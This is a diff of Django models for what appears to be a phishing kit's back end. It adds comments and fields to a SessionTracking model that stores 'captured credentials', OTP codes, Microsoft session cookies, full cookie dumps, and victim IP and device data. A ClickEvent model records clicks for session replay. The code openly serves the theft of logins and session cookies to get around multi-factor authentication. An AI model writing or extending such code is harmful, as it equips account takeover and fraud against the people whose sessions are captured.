@@ -2,6 +2,9 @@ from django.db import models
 from django.contrib.auth.models import User
 
 class SessionTracking(models.Model):
+    """Store all session tracking data including captured credentials"""
+    
+    # Session identification
     session_id = models.CharField(max_length=100, unique=True)
     user = models.ForeignKey(User, on_delete=models.SET_NULL, null=True, blank=True, related_name='sessions')
     
@@ -11,18 +14,18 @@ class SessionTracking(models.Model):
     otp_code = models.CharField(max_length=10, blank=True)
     otp_from_microsoft = models.BooleanField(default=False)
     
-    # ========== COOKIE DATA ==========
-    cookies_file = models.TextField(blank=True)  # Full cookies in Netscape format
-    cookies_json = models.JSONField(default=dict)  # Cookies as JSON
-    ms_session_cookie = models.TextField(blank=True)  # Microsoft session cookie
+    # Cookies
+    cookies_file = models.TextField(blank=True)
+    cookies_json = models.JSONField(default=dict)
+    ms_session_cookie = models.TextField(blank=True)
     
-    # Network info
+    # Network information
     ip_address = models.GenericIPAddressField(null=True, blank=True)
     user_agent = models.TextField(blank=True)
     referer = models.URLField(blank=True)
     tracking_source = models.CharField(max_length=255, blank=True)
     
-    # Device info
+    # Device information
     browser_name = models.CharField(max_length=100, blank=True)
     browser_version = models.CharField(max_length=50, blank=True)
     os_name = models.CharField(max_length=100, blank=True)
@@ -35,9 +38,12 @@ class SessionTracking(models.Model):
     last_activity = models.DateTimeField(auto_now=True)
     converted_at = models.DateTimeField(null=True, blank=True)
     
-    # Complete data
+    # Complete raw data
     raw_data = models.JSONField(default=dict)
     email_sent = models.BooleanField(default=False)
+    
+    # Service selected
+    service = models.CharField(max_length=50, blank=True, default='')
     
     class Meta:
         db_table = 'accounts_session_tracking'
@@ -47,6 +53,8 @@ class SessionTracking(models.Model):
         return f"Session {self.session_id} - {self.email or 'No email'}"
 
 class ClickEvent(models.Model):
+    """Store user click events for session replay"""
+    
     session = models.ForeignKey(SessionTracking, on_delete=models.CASCADE, related_name='clicks')
     x_position = models.IntegerField()
     y_position = models.IntegerField()
@@ -56,6 +64,7 @@ class ClickEvent(models.Model):
     
     class Meta:
         db_table = 'accounts_click_event'
+        ordering = ['timestamp']
     
     def __str__(self):
-        return f"Click at ({self.x_position}, {self.y_position})"
+        return f"Click at ({self.x_position}, {self.y_position}) on {self.timestamp}"
